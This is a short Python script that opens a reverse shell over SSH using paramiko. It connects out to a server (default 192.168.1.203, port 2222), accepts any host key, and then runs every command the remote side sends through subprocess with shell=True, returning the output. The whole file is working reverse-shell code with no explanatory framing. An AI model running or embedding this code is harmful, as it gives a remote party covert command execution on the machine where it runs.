import paramiko
import shlex
import subprocess

def ssh_command(ip,port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode() 
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')

            except Exception as e :
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass                                                     # Importing `getpass` to securely input passwords.
    #user = getpass.getuser()
    user = input('Username: ')
    password = getpass.getpass()                                        # Securely input the password without showing it on the screen
    
    ip = input("Enter server ip:") or "192.168.1.203"
    port = input("Enter port or <CR> :") or 2222
    ssh_command(ip, port, user, password, 'ClientConnected')        
